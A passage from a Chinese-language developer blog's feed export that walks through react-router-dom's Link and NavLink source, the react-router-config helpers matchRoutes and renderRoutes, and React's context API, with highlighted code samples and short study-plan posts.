...rest</span><br><span class="line">    &#125;,</span><br><span class="line">    forwardedRef</span><br><span class="line">  ) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; target &#125; = rest;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> props = &#123;</span><br><span class="line">      ...rest,</span><br><span class="line">      onClick: <span class="function"><span class="params">event</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">          <span class="keyword">if</span> (onClick) onClick(event);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ex) &#123;</span><br><span class="line">          event.preventDefault();</span><br><span class="line">          <span class="keyword">throw</span> ex;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (</span><br><span class="line">          !event.defaultPrevented &amp;&amp; <span class="comment">// onClick prevented default</span></span><br><span class="line">          event.button === <span class="number">0</span> &amp;&amp; <span class="comment">// ignore everything but left clicks</span></span><br><span class="line">          (!target || target === <span class="string">"_self"</span>) &amp;&amp; <span class="comment">// let browser handle "target=_blank" etc.</span></span><br><span class="line">          !isModifiedEvent(event) <span class="comment">// ignore clicks with modifier keys</span></span><br><span class="line">        ) &#123;</span><br><span class="line">          event.preventDefault();</span><br><span class="line">          navigate();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// React 15 compat</span></span><br><span class="line">    <span class="keyword">if</span> (forwardRefShim !== forwardRef) &#123;</span><br><span class="line">      props.ref = forwardedRef || innerRef;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      props.ref = innerRef;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* eslint-disable-next-line jsx-a11y/anchor-has-content */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">a</span> &#123;<span class="attr">...props</span>&#125; /&gt;</span></span>;</span><br><span class="line">  &#125;</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (__DEV__) &#123;</span><br><span class="line">  LinkAnchor.displayName = <span class="string">"LinkAnchor"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The public API for rendering a history-aware &lt;a&gt;.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> Link = forwardRef(</span><br><span class="line">  (</span><br><span class="line">    &#123;</span><br><span class="line">      component = LinkAnchor,</span><br><span class="line">      replace,</span><br><span class="line">      to,</span><br><span class="line">      innerRef, <span class="comment">// <span class="doctag">TODO:</span> deprecate</span></span><br><span class="line">      ...rest</span><br><span class="line">    &#125;,</span><br><span class="line">    forwardedRef</span><br><span class="line">  ) =&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;RouterContext.Consumer&gt;</span><br><span class="line">        &#123;context =&gt; &#123;</span><br><span class="line">          invariant(context, <span class="string">"You should not use &lt;Link&gt; outside a &lt;Router&gt;"</span>);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">const</span> &#123; history &#125; = context;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">const</span> location = normalizeToLocation(</span><br><span class="line">            resolveToLocation(to, context.location),</span><br><span class="line">            context.location</span><br><span class="line">          );</span><br><span class="line"></span><br><span class="line">          <span class="keyword">const</span> href = location ? history.createHref(location) : <span class="string">""</span>;</span><br><span class="line">          <span class="keyword">const</span> props = &#123;</span><br><span class="line">            ...rest,</span><br><span class="line">            href,</span><br><span class="line">            navigate() &#123;</span><br><span class="line">              <span class="keyword">const</span> location = resolveToLocation(to, context.location);</span><br><span class="line">              <span class="keyword">const</span> method = replace ? history.replace : history.push;</span><br><span class="line"></span><br><span class="line">              method(location);</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;;</span><br><span class="line"></span><br><span class="line">          <span class="comment">// React 15 compat</span></span><br><span class="line">          <span class="keyword">if</span> (forwardRefShim !== forwardRef) &#123;</span><br><span class="line">            props.ref = forwardedRef || innerRef;</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            props.innerRef = innerRef;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">return</span> React.createElement(component, props);</span><br><span class="line">        &#125;&#125;</span><br><span class="line">      &lt;<span class="regexp">/RouterContext.Consumer&gt;</span></span><br><span class="line"><span class="regexp">    );</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">);</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">export default Link;</span></span><br></pre></td></tr></table></figure>
<h2 id="NavLink"><a href="#NavLink" class="headerlink" title="NavLink"></a>NavLink</h2><p>NavLink是基于Link的，它主要功能是可以自定义设置一些activeStyle、className，从而改变Link的样式。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">"react"</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; __RouterContext <span class="keyword">as</span> RouterContext, matchPath &#125; <span class="keyword">from</span> <span class="string">"react-router"</span>;</span><br><span class="line"><span class="keyword">import</span> PropTypes <span class="keyword">from</span> <span class="string">"prop-types"</span>;</span><br><span class="line"><span class="keyword">import</span> invariant <span class="keyword">from</span> <span class="string">"tiny-invariant"</span>;</span><br><span class="line"><span class="keyword">import</span> Link <span class="keyword">from</span> <span class="string">"./Link.js"</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;</span><br><span class="line">  resolveToLocation,</span><br><span class="line">  normalizeToLocation</span><br><span class="line">&#125; <span class="keyword">from</span> <span class="string">"./utils/locationUtils.js"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// React 15 compat</span></span><br><span class="line"><span class="keyword">const</span> forwardRefShim = <span class="function"><span class="params">C</span> =&gt;</span> C;</span><br><span class="line"><span class="keyword">let</span> &#123; forwardRef &#125; = React;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">typeof</span> forwardRef === <span class="string">"undefined"</span>) &#123;</span><br><span class="line">  forwardRef = forwardRefShim;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">joinClassnames</span>(<span class="params">...classnames</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> classnames.filter(<span class="function"><span class="params">i</span> =&gt;</span> i).join(<span class="string">" "</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * A &lt;Link&gt; wrapper that knows if it's "active" or not.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> NavLink = forwardRef(</span><br><span class="line">  (</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">"aria-current"</span>: ariaCurrent = <span class="string">"page"</span>,</span><br><span class="line">      activeClassName = <span class="string">"active"</span>,</span><br><span class="line">      activeStyle,</span><br><span class="line">      className: classNameProp,</span><br><span class="line">      exact,</span><br><span class="line">      isActive: isActiveProp,</span><br><span class="line">      location: locationProp,</span><br><span class="line">      sensitive,</span><br><span class="line">      strict,</span><br><span class="line">      style: styleProp,</span><br><span class="line">      to,</span><br><span class="line">      innerRef, <span class="comment">// <span class="doctag">TODO:</span> deprecate</span></span><br><span class="line">      ...rest</span><br><span class="line">    &#125;,</span><br><span class="line">    forwardedRef</span><br><span class="line">  ) =&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;RouterContext.Consumer&gt;</span><br><span class="line">        &#123;context =&gt; &#123;</span><br><span class="line">          invariant(context, <span class="string">"You should not use &lt;NavLink&gt; outside a &lt;Router&gt;"</span>);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">const</span> currentLocation = locationProp || context.location;</span><br><span class="line">          <span class="keyword">const</span> toLocation = normalizeToLocation(</span><br><span class="line">            resolveToLocation(to, currentLocation),</span><br><span class="line">            currentLocation</span><br><span class="line">          );</span><br><span class="line">          <span class="keyword">const</span> &#123; <span class="attr">pathname</span>: path &#125; = toLocation;</span><br><span class="line">          <span class="comment">// Regex taken from: https://github.com/pillarjs/path-to-regexp/blob/master/index.js#L202</span></span><br><span class="line">          <span class="keyword">const</span> escapedPath =</span><br><span class="line">            path &amp;&amp; path.replace(<span class="regexp">/([.+*?=^!:$&#123;&#125;()[\]|/\\])/g</span>, <span class="string">"\\$1"</span>);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">const</span> match = escapedPath</span><br><span class="line">            ? matchPath(currentLocation.pathname, &#123;</span><br><span class="line">                path: escapedPath,</span><br><span class="line">                exact,</span><br><span class="line">                sensitive,</span><br><span class="line">                strict</span><br><span class="line">              &#125;)</span><br><span class="line">            : <span class="literal">null</span>;</span><br><span class="line">          <span class="keyword">const</span> isActive = !!(isActiveProp</span><br><span class="line">            ? isActiveProp(match, currentLocation)</span><br><span class="line">            : match);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">const</span> className = isActive</span><br><span class="line">            ? joinClassnames(classNameProp, activeClassName)</span><br><span class="line">            : classNameProp;</span><br><span class="line">          <span class="keyword">const</span> style = isActive ? &#123; ...styleProp, ...activeStyle &#125; : styleProp;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">const</span> props = &#123;</span><br><span class="line">            <span class="string">"aria-current"</span>: (isActive &amp;&amp; ariaCurrent) || <span class="literal">null</span>,</span><br><span class="line">            className,</span><br><span class="line">            style,</span><br><span class="line">            to: toLocation,</span><br><span class="line">            ...rest</span><br><span class="line">          &#125;;</span><br><span class="line"></span><br><span class="line">          <span class="comment">// React 15 compat</span></span><br><span class="line">          <span class="keyword">if</span> (forwardRefShim !== forwardRef) &#123;</span><br><span class="line">            props.ref = forwardedRef || innerRef;</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            props.innerRef = innerRef;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">Link</span> &#123;<span class="attr">...props</span>&#125; /&gt;</span></span>;</span><br><span class="line">        &#125;&#125;</span><br><span class="line">      &lt;<span class="regexp">/RouterContext.Consumer&gt;</span></span><br><span class="line"><span class="regexp">    );</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">);</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">export default NavLink;</span></span><br></pre></td></tr></table></figure>
<h1 id="react-router-config"><a href="#react-router-config" class="headerlink" title="react-router-config"></a>react-router-config</h1><p>react-router-config是为了方便我们使用类似下面的配置来编写react-router</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> routes = [</span><br><span class="line">  &#123;</span><br><span class="line">    component: Root,</span><br><span class="line">    routes: [</span><br><span class="line">      &#123;</span><br><span class="line">        path: <span class="string">"/"</span>,</span><br><span class="line">        exact: <span class="literal">true</span>,</span><br><span class="line">        component: Home</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        path: <span class="string">"/child/:id"</span>,</span><br><span class="line">        component: Child,</span><br><span class="line">        routes: [</span><br><span class="line">          &#123;</span><br><span class="line">            path: <span class="string">"/child/:id/grand-child"</span>,</span><br><span class="line">            component: GrandChild</span><br><span class="line">          &#125;</span><br><span class="line">        ]</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">];</span><br></pre></td></tr></table></figure>
<p>它只有两个api，matchRoutes和renderRoutes。</p>
<h2 id="matchRoutes"><a href="#matchRoutes" class="headerlink" title="matchRoutes"></a>matchRoutes</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; matchPath, Router &#125; <span class="keyword">from</span> <span class="string">"react-router"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">matchRoutes</span>(<span class="params">routes, pathname, <span class="regexp">/*not public API*/</span> branch = []</span>) </span>&#123;</span><br><span class="line">  routes.some(<span class="function"><span class="params">route</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> match = route.path</span><br><span class="line">      ? matchPath(pathname, route)</span><br><span class="line">      : branch.length</span><br><span class="line">      ? branch[branch.length - <span class="number">1</span>].match <span class="comment">// use parent match</span></span><br><span class="line">      : Router.computeRootMatch(pathname); <span class="comment">// use default "root" match</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (match) &#123;</span><br><span class="line">      branch.push(&#123; route, match &#125;);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (route.routes) &#123;</span><br><span class="line">        matchRoutes(route.routes, pathname, branch);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> match;</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> branch;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> matchRoutes;</span><br></pre></td></tr></table></figure>
<h2 id="renderRoutes"><a href="#renderRoutes" class="headerlink" title="renderRoutes"></a>renderRoutes</h2><p>renderRoutes在组件中使用，可以根据前面的路由配置渲染相应的组件。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">"react"</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; Switch, Route &#125; <span class="keyword">from</span> <span class="string">"react-router"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">renderRoutes</span>(<span class="params">routes, extraProps = &#123;&#125;, switchProps = &#123;&#125;</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> routes ? (</span><br><span class="line">    &lt;Switch &#123;...switchProps&#125;&gt;</span><br><span class="line">      &#123;routes.map(<span class="function">(<span class="params">route, i</span>) =&gt;</span> (</span><br><span class="line">        &lt;Route</span><br><span class="line">          key=&#123;route.key || i&#125;</span><br><span class="line">          path=&#123;route.path&#125;</span><br><span class="line">          exact=&#123;route.exact&#125;</span><br><span class="line">          strict=&#123;route.strict&#125;</span><br><span class="line">          render=&#123;props =&gt;</span><br><span class="line">            route.render ? (</span><br><span class="line">              route.render(&#123; ...props, ...extraProps, <span class="attr">route</span>: route &#125;)</span><br><span class="line">            ) : (</span><br><span class="line">              &lt;route.component &#123;...props&#125; &#123;...extraProps&#125; route=&#123;route&#125; /&gt;</span><br><span class="line">            )</span><br><span class="line">          &#125;</span><br><span class="line">        /&gt;</span><br><span class="line">      ))&#125;</span><br><span class="line">    &lt;<span class="regexp">/Switch&gt;</span></span><br><span class="line"><span class="regexp">  ) : null;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">export default renderRoutes;</span></span><br></pre></td></tr></table></figure>
<p>使用示例如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; renderRoutes &#125; <span class="keyword">from</span> <span class="string">"react-router-config"</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">const</span> routes = [</span><br><span class="line">  &#123;</span><br><span class="line">    component: Root,</span><br><span class="line">    routes: [</span><br><span class="line">      &#123;</span><br><span class="line">        path: <span class="string">"/"</span>,</span><br><span class="line">        exact: <span class="literal">true</span>,</span><br><span class="line">        component: Home</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        path: <span class="string">"/child/:id"</span>,</span><br><span class="line">        component: Child,</span><br><span class="line">        routes: [</span><br><span class="line">          &#123;</span><br><span class="line">            path: <span class="string">"/child/:id/grand-child"</span>,</span><br><span class="line">            component: GrandChild</span><br><span class="line">          &#125;</span><br><span class="line">        ]</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">];</span><br><span class="line"> </span><br><span class="line"><span class="keyword">const</span> Root = <span class="function">(<span class="params">&#123; route &#125;</span>) =&gt;</span> (</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;h1&gt;Root&lt;<span class="regexp">/h1&gt;</span></span><br><span class="line"><span class="regexp">    &#123;/</span>* child routes won<span class="string">'t render without this */&#125;</span></span><br><span class="line"><span class="string">    &#123;renderRoutes(route.routes)&#125;</span></span><br><span class="line"><span class="string">  &lt;/div&gt;</span></span><br><span class="line"><span class="string">);</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">const Home = (&#123; route &#125;) =&gt; (</span></span><br><span class="line"><span class="string">  &lt;div&gt;</span></span><br><span class="line"><span class="string">    &lt;h2&gt;Home&lt;/h2&gt;</span></span><br><span class="line"><span class="string">  &lt;/div&gt;</span></span><br><span class="line"><span class="string">);</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">const Child = (&#123; route &#125;) =&gt; (</span></span><br><span class="line"><span class="string">  &lt;div&gt;</span></span><br><span class="line"><span class="string">    &lt;h2&gt;Child&lt;/h2&gt;</span></span><br><span class="line"><span class="string">    &#123;/* child routes won'</span>t render without <span class="keyword">this</span> *<span class="regexp">/&#125;</span></span><br><span class="line"><span class="regexp">    &#123;renderRoutes(route.routes, &#123; someProp: "these extra props are optional" &#125;)&#125;</span></span><br><span class="line"><span class="regexp">  &lt;/</span>div&gt;</span><br><span class="line">);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">const</span> GrandChild = <span class="function">(<span class="params">&#123; someProp &#125;</span>) =&gt;</span> (</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;h3&gt;Grand Child&lt;<span class="regexp">/h3&gt;</span></span><br><span class="line"><span class="regexp">    &lt;div&gt;&#123;someProp&#125;&lt;/</span>div&gt;</span><br><span class="line">  &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">);</span></span><br><span class="line"><span class="regexp"> </span></span><br><span class="line"><span class="regexp">ReactDOM.render(</span></span><br><span class="line"><span class="regexp">  &lt;BrowserRouter&gt;</span></span><br><span class="line"><span class="regexp">    &#123;/</span>* kick it all off <span class="keyword">with</span> the root route *<span class="regexp">/&#125;</span></span><br><span class="line"><span class="regexp">    &#123;renderRoutes(routes)&#125;</span></span><br><span class="line"><span class="regexp">  &lt;/</span>BrowserRouter&gt;,</span><br><span class="line">  <span class="built_in">document</span>.getElementById(<span class="string">"root"</span>)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<h1 id="react-router-native"><a href="#react-router-native" class="headerlink" title="react-router-native"></a>react-router-native</h1><p>react-router里最后一个包是react-router-native，因为没有做过相关业务，就没有研究了。</p>
]]></content>
  </entry>
  <entry>
    <title>redux源码</title>
    <url>/2020/08/28/redux%E6%BA%90%E7%A0%81/</url>
    <content><![CDATA[<p>redux源码</p>
<a id="more"></a>
<p>redux源码</p>
<p>redux-thunk</p>
<p>logger</p>
]]></content>
  </entry>
  <entry>
    <title>近期学习计划</title>
    <url>/2020/08/31/%E8%BF%91%E6%9C%9F%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/</url>
    <content><![CDATA[<p>react文档</p>
<p>react redux react-router</p>
<p>Es6</p>
<p>Webpack</p>
<p>小程序</p>
]]></content>
  </entry>
  <entry>
    <title>react的context</title>
    <url>/2020/09/07/react%E7%9A%84context/</url>
    <content><![CDATA[<p>react的context</p>
<a id="more"></a>
<p>在一个典型的 React 应用中，数据是通过 props 属性自上而下（由父及子）进行传递的，但这种做法对于某些类型的属性而言是极其繁琐的（例如：地区偏好，UI 主题），这些属性是应用程序中许多组件都需要的。Context 提供了一种在组件之间共享此类值的方式，而不必显式地通过组件树的逐层传递 props。</p>
<h2 id="何时使用Context"><a href="#何时使用Context" class="headerlink" title="何时使用Context"></a>何时使用Context</h2><p>Context 设计目的是为了共享那些对于一个组件树而言是“全局”的数据，例如当前认证的用户、主题或首选语言。</p>
<p>比如，每一个按钮都需要知道theme的值，层层传递是很麻烦的事。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">Toolbar</span> <span class="attr">theme</span>=<span class="string">"dark"</span> /&gt;</span></span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Toolbar</span>(<span class="params">props</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;ThemedButton theme=&#123;props.theme&#125; /&gt;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ThemedButton</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">Button</span> <span class="attr">theme</span>=<span class="string">&#123;this.props.theme&#125;</span> /&gt;</span></span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用 context, 我们可以避免通过中间元素传递 props：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// 为当前的 theme 创建一个 context（“light”为默认值）。</span></span><br><span class="line"><span class="keyword">const</span> ThemeContext = React.createContext(<span class="string">'light'</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="comment">// 使用一个 Provider 来将当前的 theme 传递给以下的组件树。</span></span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;ThemeContext.Provider value=<span class="string">"dark"</span>&gt;</span><br><span class="line">        &lt;Toolbar /&gt;</span><br><span class="line">      &lt;<span class="regexp">/ThemeContext.Provider&gt;</span></span><br><span class="line"><span class="regexp">    );</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">function Toolbar() &#123;</span></span><br><span class="line"><span class="regexp">  return (</span></span><br><span class="line"><span class="regexp">    &lt;ThemedButton /</span>&gt;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ThemedButton</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 指定 contextType 读取当前的 theme context。</span></span><br><span class="line">  <span class="comment">// React 会往上找到最近的 theme Provider，然后使用它的值。</span></span><br><span class="line">  <span class="keyword">static</span> contextType = ThemeContext;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">Button</span> <span class="attr">theme</span>=<span class="string">&#123;this.context&#125;</span> /&gt;</span></span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="使用-Context-之前的考虑"><a href="#使用-Context-之前的考虑" class="headerlink" title="使用 Context 之前的考虑"></a>使用 Context 之前的考虑</h2><p>Context 主要应用场景在于很多不同层级的组件需要访问同样一些的数据。请谨慎使用，因为这会使得组件的复用性变差。</p>
<p>如果你只是想避免层层传递一些属性，组件组合（component composition）有时候是一个比 context 更好的解决方案。</p>
<p>比如，考虑这样一个 Page 组件，它层层向下传递 user 和 avatarSize 属性，从而深度嵌套的 Link 和 Avatar 组件可以读取到这些属性：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;Page user=&#123;user&#125; avatarSize=&#123;avatarSize&#125; /&gt;</span><br><span class="line">  <span class="comment">// ... 渲染出 ...</span></span><br><span class="line">  &lt;PageLayout user=&#123;user&#125; avatarSize=&#123;avatarSize&#125; /&gt;</span><br><span class="line">    <span class="comment">// ... 渲染出 ...</span></span><br><span class="line">    &lt;NavigationBar user=&#123;user&#125; avatarSize=&#123;avatarSize&#125; /&gt;</span><br><span class="line">      <span class="comment">// ... 渲染出 ...</span></span><br><span class="line">      &lt;Link href=&#123;user.permalink&#125;&gt;</span><br><span class="line">        &lt;Avatar user=&#123;user&#125; size=&#123;avatarSize&#125; /&gt;</span><br><span class="line">      &lt;<span class="regexp">/Link&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>如果在最后只有 Avatar 组件真的需要 user 和 avatarSize，那么层层传递这两个 props 就显得非常冗余。而且一旦 Avatar 组件需要更多从来自顶层组件的 props，你还得在中间层级一个一个加上去，这将会变得非常麻烦。</p>
<p>一种无需 context 的解决方案是将 Avatar 组件自身传递下去，因而中间组件无需知道 user 或者 avatarSize 等 props：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Page</span>(<span class="params">props</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> user = props.user;</span><br><span class="line">  <span class="keyword">const</span> userLink = (</span><br><span class="line">    &lt;Link href=&#123;user.permalink&#125;&gt;</span><br><span class="line">      &lt;Avatar user=&#123;user&#125; size=&#123;props.avatarSize&#125; /&gt;</span><br><span class="line">    &lt;<span class="regexp">/Link&gt;</span></span><br><span class="line"><span class="regexp">  );</span></span><br><span class="line"><span class="regexp">  return &lt;PageLayout userLink=&#123;userLink&#125; /</span>&gt;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 现在，我们有这样的组件：</span></span><br><span class="line">&lt;Page user=&#123;user&#125; avatarSize=&#123;avatarSize&#125; /&gt;</span><br><span class="line">  <span class="comment">// ... 渲染出 ...</span></span><br><span class="line">  &lt;PageLayout userLink=&#123;...&#125; /&gt;</span><br><span class="line">    <span class="comment">// ... 渲染出 ...</span></span><br><span class="line">    &lt;NavigationBar userLink=&#123;...&#125; /&gt;</span><br><span class="line">      <span class="comment">// ... 渲染出 ...</span></span><br><span class="line">      &#123;props.userLink&#125;</span><br></pre></td></tr></table></figure></p>
<p>这种对组件的控制反转减少了在你的应用中要传递的 props 数量，这在很多场景下会使得你的代码更加干净，使你对根组件有更多的把控。但是，这并不适用于每一个场景：这种将逻辑提升到组件树的更高层次来处理，会使得这些高层组件变得更复杂，并且会强行将低层组件适应这样的形式，这可能不会是你想要的。</p>
<p>这种模式足够覆盖很多场景了，在这些场景下你需要将子组件和直接关联的父组件解耦。如果子组件需要在渲染前和父组件进行一些交流，你可以进一步使用 render props。</p>
<p>使用 context 的通用的场景包括管理当前的 locale，theme，或者一些缓存数据，这比替代方案要简单的多。</p>
<h1 id="API"><a href="#API" class="headerlink" title="API"></a>API</h1><h2 id="React-createContext"><a href="#React-createContext" class="headerlink" title="React.createContext"></a>React.createContext</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> MyContext = React.createContext(defaultValue);</span><br></pre></td></tr></table></figure>
<p>创建一个 Context 对象。当 React 渲染一个订阅了这个 Context 对象的组件，这个组件会从组件树中离自身最近的那个匹配的 Provider 中读取到当前的 context 值。</p>
<p>只有当组件所处的树中没有匹配到 Provider 时，其 defaultValue 参数才会生效。</p>
<h2 id="Context-Provider"><a href="#Context-Provider" class="headerlink" title="Context.Provider"></a>Context.Provider</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;MyContext.Provider value=&#123;<span class="comment">/* 某个值 */</span>&#125;&gt;</span><br></pre></td></tr></table></figure>
<p>每个 Context 对象都会返回一个 Provider React 组件，它允许消费组件订阅 context 的变化。</p>
<p>Provider 接收一个 value 属性，传递给消费组件。一个 Provider 可以和多个消费组件有对应关系。多个 Provider 也可以嵌套使用，里层的会覆盖外层的数据。</p>
<p>当 Provider 的 value 值发生变化时，它内部的所有消费组件都会重新渲染。Provider 及其内部 consumer 组件都不受制于 shouldComponentUpdate 函数，因此当 consumer 组件在其祖先组件退出更新的情况下也能更新。</p>
<p>通过新旧值检测来确定变化，使用了与 Object.is 相同的算法。</p>
<h2 id="Class-contextType"><a href="#Class-contextType" class="headerlink" title="Class.contextType"></a>Class.contextType</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;</span><br><span class="line">  componentDidMount() &#123;</span><br><span class="line">    <span class="keyword">let</span> value = <span class="keyword">this</span>.context;</span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line">  &#125;</span><br><span class="line">  componentDidUpdate() &#123;</span><br><span class="line">    <span class="keyword">let</span> value = <span class="keyword">this</span>.context;</span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line">  &#125;</span><br><span class="line">  componentWillUnmount() &#123;</span><br><span class="line">    <span class="keyword">let</span> value = <span class="keyword">this</span>.context;</span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line">  &#125;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">let</span> value = <span class="keyword">this</span>.context;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">MyClass.contextType = MyContext;</span><br></pre></td></tr></table></figure>
